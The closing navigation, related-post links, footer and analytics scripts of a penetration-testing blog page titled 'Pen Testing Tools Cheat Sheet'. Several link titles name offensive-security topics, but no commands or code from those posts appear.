</ul>
</div>
<section class="share-box">

:::::: grid
      <div class="unit whole">
        <div class="grid pane">
          <div class="unit whole center-on-mobiles">
            <div class="pane-content">
              <h2>Share this on...</h2>
              <p><a href="https://twitter.com/intent/tweet?text=Pen Testing Tools Cheat Sheet&url=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/&via=Arr0way&related=Arr0way" rel="nofollow" target="_blank" title="Share on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
              <a href="https://facebook.com/sharer.php?u=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" rel="nofollow" target="_blank" title="Share on Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i> Facebook</a>
              <a href="https://www.reddit.com/submit?url=https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/&title=Pen Testing Tools Cheat Sheet" rel="nofollow" target="_blank" title="Share on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Reddit</a></p>

              <h2>Join us On Reddt @HighOnCoffee</h2>
              <p><a href="https://www.reddit.com/r/HighOnCoffee/" target="_blank" title="Sub to @HighOnCoffee on Reddit"><i class="fa fa-reddit-square" aria-hidden="true"></i> Join the @HighOnCoffee community on Reddit</a>


              <h2><br>Follow Arr0way</h2>
              <p><a href="https://infosec.exchange/@Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Mastodon"><i class="fa fa-twitter-square" aria-hidden="true"></i> Mastodon</a>
              <p><a href="https://twitter.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a>
              <a href="https://github.com/Arr0way" rel="nofollow" target="_blank" title="Follow Arr0way on GitHub"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></p>
            <p><br></p>
            </div>
           </div>
           <h2><br>Also... <br> <br>You might want to read these</h2>
      </div>
    </div>

</section>

::: mobile-side-scroller
<table>
<thead>
<tr>
<th>
Category
</th>
<th>
Post Name
</th>
</tr>
</thead>

    <tbody>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/katana-cheat-sheet/">Katana Cheat Sheet - Commands, Flags & Examples</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands, Flags, Switches & Examples (2024)</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/adb-command-cheat-sheet/">ADB Commands Cheat Sheet - Flags, Switches & Examples Tutorial</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/httpx-cheat-sheet/">httpx Cheat Sheet - Commands & Examples Tutorial</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/sqlmap-cheat-sheet/">SQLMap Cheat Sheet: Flags & Commands for SQL Injection</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/nikto-cheat-sheet/">Nikto Cheat Sheet - Commands & Examples</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/subfinder-cheat-sheet/">Subfinder Cheat Sheet</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/naabu-cheat-sheet/">Naabu Cheat Sheet: Commands & Examples</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>cheat-sheet</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python</a></b></p></pc>
             </td>
          </tr>
          
          <tr>
             <td>
               <pc><p><code>Web App Security</code></p></pc>
             </td>
             <td>
               <pc><p><b><a href="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a></b></p></pc>
             </td>
          </tr>
          
        </tbody>

</table>
:::

</article>

      </div>

      <div class="unit one-fifth hide-on-mobiles">

<aside>
<ul>
<li class>
`<a href="/penetration-testing/">`{=html}What is Penetration
Testing`</a>`{=html}
</li>
<li class>
`<a href="/blog/cheat-sheet/">`{=html}Cheat Sheets`</a>`{=html}
</li>
<li class>
`<a href="/blog/techniques/">`{=html}Techniques`</a>`{=html}
</li>
<li class>
`<a href="/blog/security-hardening/">`{=html}Security
Hardening`</a>`{=html}
</li>
<li class>
`<a href="/blog/walkthroughs/">`{=html}WalkThroughs`</a>`{=html}
</li>
</ul>
<h4>
Cheat Sheets
</h4>
<ul>

     <li class="">
            <a href="/blog/katana-cheat-sheet/">Katana Cheat Sheet - Commands, Flags & Examples</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/nmap-cheat-sheet/">Nmap Cheat Sheet: Commands, Flags, Switches & Examples (2024)</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/adb-command-cheat-sheet/">ADB Commands Cheat Sheet - Flags, Switches & Examples Tutorial</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/httpx-cheat-sheet/">httpx Cheat Sheet - Commands & Examples Tutorial</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/sqlmap-cheat-sheet/">SQLMap Cheat Sheet: Flags & Commands for SQL Injection</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/nikto-cheat-sheet/">Nikto Cheat Sheet - Commands & Examples</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/subfinder-cheat-sheet/">Subfinder Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/naabu-cheat-sheet/">Naabu Cheat Sheet: Commands & Examples</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/reverse-shell-cheat-sheet/">Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/dns-tunnel-dnscat2-cheat-sheet/">DNS Tunneling dnscat2 Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/ssh-lateral-movement-cheat-sheet/">SSH Lateral Movement Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/android-app-pen-testing-environment/">Android Pen Testing Environment Setup</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/password-reset-security-testing-cheat-sheet/">Password Reset Testing Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/ssrf-cheat-sheet/">SSRF Cheat Sheet & Bypass Techniques</a>
           </li>
        
      
        
           <li class="current">
            <a href="/blog/penetration-testing-tools-cheat-sheet/">Pen Testing Tools Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/lfi-cheat-sheet/">LFI Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/vi-cheat-sheet/">Vim Cheat Sheet [2022 Update] + NEOVIM</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/systemd-cheat-sheet/">Systemd Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/nbtscan-cheat-sheet/">nbtscan Cheat Sheet</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/linux-commands-cheat-sheet/">Linux Commands Cheat Sheet</a>
           </li>
        
      
      <li>
        <a href="/blog/cheat-sheet/">More »</a>
      </li>
    </ul>
    <h4>WalkThroughs</h4>
    <ul>
      
        
           <li class="">
            <a href="/blog/insomnihack-ctf-teaser-smartcat2-writeup/">InsomniHack CTF Teaser - Smartcat2 Writeup</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/insomnihack-ctf-teaser-smartcat1-writeup/">InsomniHack CTF Teaser - Smartcat1 Writeup</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/fristileaks-walkthrough/">FristiLeaks 1.3 Walkthrough</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/sickos-1-walkthrough/">SickOS 1.1 - Walkthrough</a>
           </li>
        
      
        
           <li class="">
            <a href="/blog/the-wall-walkthrough/">The Wall Boot2Root Walkthrough</a>
           </li>
        
      
      <li>
        <a href="/blog/walkthroughs/">More »</a>
      </li>
    </ul>
    <h4>Techniques</h4>
    <ul>
      
        
           <li class="">
            <a href="/blog/ssh-meterpreter-pivoting-techniques/">SSH & Meterpreter Pivoting Techniques</a>
           </li>
        
      
      <li>
        <a href="/blog/techniques/">More »</a>
      </li>
    </ul>
    <h4>Security Hardening</h4>
    <ul>
      
        
           <li class="">
            <a href="/blog/security-harden-centos-7/">Security Harden CentOS 7</a>
           </li>
        
      
      <li>
        <a href="/blog/security-hardening/">More »</a>
      </li>
    </ul>
    <h4>/dev/urandom</h4>
    <ul>
      
        
           <li class="">
            <a href="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
           </li>
        
      
      <li>
        <a href="/blog/urandom/">More »</a>
      </li>
    </ul>
    <h4>Other Blog</h4>
    <ul>
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
             
              
                
                  
                    
                      
                  <li class="">
                    <a href="/blog/insecure-direct-object-reference-idor/">Insecure Direct Object Reference (IDOR): Definition, Examples & How to Find</a>
                  </li>
                     
                   
                  
                  
              
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
             
              
                
                  
                    
                      
                  <li class="">
                    <a href="/blog/kali-chromium-install/">HowTo: Kali Linux Chromium Install for Web App Pen Testing</a>
                  </li>
                     
                   
                  
                  
              
            
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
            
          
        
          
             
              
                
                  
                    
                      
                  <li class="">
                    <a href="/blog/jenkins-api-unauthenticated-rce-exploit/">Jenkins RCE via Unauthenticated API</a>
                  </li>
                     
                   
                  
                  
              
            
          
        
          
        
          
        
          
            
          
        
          
        
          
             
              
                
                  
                    
                      
                  <li class="">
                    <a href="/blog/macbook-post-install-check-list/">MacBook - Post Install Config + Apps</a>
                  </li>
                     
                   
                  
                  
              
            
          
        
          
        
          
            
          
        
          
             
              
                
                  
                    
                      
                  <li class="">
                    <a href="/blog/enum4linux-cheat-sheet/">enum4linux Cheat Sheet - Commands & Examples</a>
                  </li>
                     
                   
                  
                  
              
            
          
        
          
             
              
                
                  
                    
                      
                  <li class="">
                    <a href="/blog/linux-local-enumeration-script/">Linux Local Enumeration Script</a>
                  </li>
                     
                   
                  
                  
              
            
          
        
          
             
              
            
          
        
          
             
              
                
                  
                  
              
            
          
        
          
        
          
        
          
        
          
            
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
    </ul>

</aside>
</div>

::: clear
:::

</div>
</section>
<footer>

::: grid
    <div class="unit one-third center-on-mobiles">
      <p>The contents of this website are &copy;&nbsp;2025 <a href="https://highon.coffee/">HighOn.Coffee</a></p>
    </div>
    <div class="unit two-thirds align-right center-on-mobiles">
      <p>
        Proudly hosted by
          <img src="/img/footer-logo.png" width="100" height="30" alt="GitHub • Social coding">
        </a>
      </p>
    </div>
:::

</footer>
<script>
  var anchorForId = function (id) {
    var anchor = document.createElement("a");
    anchor.className = "header-link";
    anchor.href      = "#" + id;
    anchor.innerHTML = "<i class=\"fa fa-link\"></i>";
    return anchor;
  };

  var linkifyAnchors = function (level, containingElement) {
    var headers = containingElement.getElementsByTagName("h" + level);
    for (var h = 0; h < headers.length; h++) {
      var header = headers[h];

      if (typeof header.id !== "undefined" && header.id !== "") {
        header.appendChild(anchorForId(header.id));
      }
    }
  };

  document.onreadystatechange = function () {
    if (this.readyState === "complete") {
      var contentBlock = document.getElementsByClassName("docs")[0] || document.getElementsByClassName("blog")[0];
      if (!contentBlock) {
        return;
      }
      for (var level = 1; level <= 6; level++) {
        linkifyAnchors(level, contentBlock);
      }
    }
  };
</script>
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-55017594-1', 'auto');
  ga('send', 'pageview');

</script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'975d24d95e1fedb4',t:'MTc1NjMxNDIyMw=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script>
</body>
</html>
::::::
:::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
